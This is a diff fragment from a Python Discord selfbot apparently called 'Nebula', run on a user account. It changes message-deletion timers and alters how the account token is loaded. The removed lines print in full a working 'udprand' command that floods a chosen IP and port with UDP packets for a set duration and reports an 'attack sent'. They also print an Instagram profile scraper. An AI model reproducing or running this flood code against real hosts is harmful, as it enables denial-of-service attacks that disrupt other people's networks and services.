     embed=discord.Embed(title=f"Encoded!",description=f"{base64_message}",color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -1245,7 +1176,7 @@ async def yoink(ctx, *, message):
     embed=discord.Embed(title=f"",description=f"{base64_message}",color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -1257,64 +1188,7 @@ async def gethost(ctx, *, ip: str):
     embed.add_field(name="IP", value=f"{ip}\n", inline=True)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
-
-@client.command()
-async def udprand(ctx, ip, port: int, dur: int):
-    await ctx.message.delete()
-    print (f"\033[32m{client.user.name}\033[39m sent an attack using udprand\033[35m to {ip} for {dur}\033[39m")
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(65500)
-    data = [
-        '\\x05',
-        '\\xca',
-        '\\x16',
-        '\\x9c',
-        '\\x11',
-        '\\xf9',
-        '\\x89',
-        '\\x00',
-        '\\x8b',
-        '\\x45',
-        '\\x7b',
-        '\\xef',
-        '\\x01',
-        '\\x45',
-        '\\xef',
-        '\\xb9'
-    ]
-    payload = "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44".encode()
-
-    stop = time.time() + dur
-    embed=discord.Embed(title=f"‏‏‎Nebula", description=f"\n\n **Attack sent to {ip}** \n Port = {port} \n Time= {dur} \n Method = udphex",color=0xbf00ff, timestamp=ctx.message.created_at)
-    embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
-
-    while time.time() < stop:
-        sock.sendto(payload, (ip, port))
-
-@client.command()
-async def insta(ctx, *, name):
-    await ctx.message.delete()
-    x = requests.get(f"https://www.instagram.com/{name}/?__a=1").text
-
-    try:
-        load = json.loads(x)
-        em = discord.Embed(title=f"{name}'s Insta info", color=0xbf00ff, timestamp=ctx.message.created_at)
-        em.add_field(name="Following: ", value=str(load['graphql']['user']['edge_follow']['count']), inline=False)
-        em.add_field(name="Followers: ", value=str(load['graphql']['user']['edge_followed_by']['count']), inline=False)
-        em.add_field(name="Name: ", value=str(load['graphql']['user']['full_name']), inline=False)
-        em.add_field(name="Number of posts: ", value=len(load['graphql']['user']['edge_owner_to_timeline_media']['edges']), inline=False)
-        em.set_thumbnail(url=str(load['graphql']['user']['profile_pic_url']))
-        em.set_footer(text=f'{footer} ')
-        await ctx.send(embed=em, delete_after=10)
-    except Exception as e:
-        if "graphql" in str(e):
-            em = discord.Embed(title=f"Invalid Username", color=0xbf00ff, timestamp=ctx.message.created_at)
-            em.set_footer(text=f'{footer} ')
-            await ctx.send(embed=em, delete_after=10)
-        else:
-            print(e)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 @client.event
 async def on_command_error(ctx, error):
@@ -1342,4 +1216,4 @@ async def watching(ctx, *, message):
     await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{message}"))
 
 loading()
-client.run(token, reconnect=True, bot=False)
+client.run(asyncio.get_event_loop().run_until_complete(getToken()), bot=False)
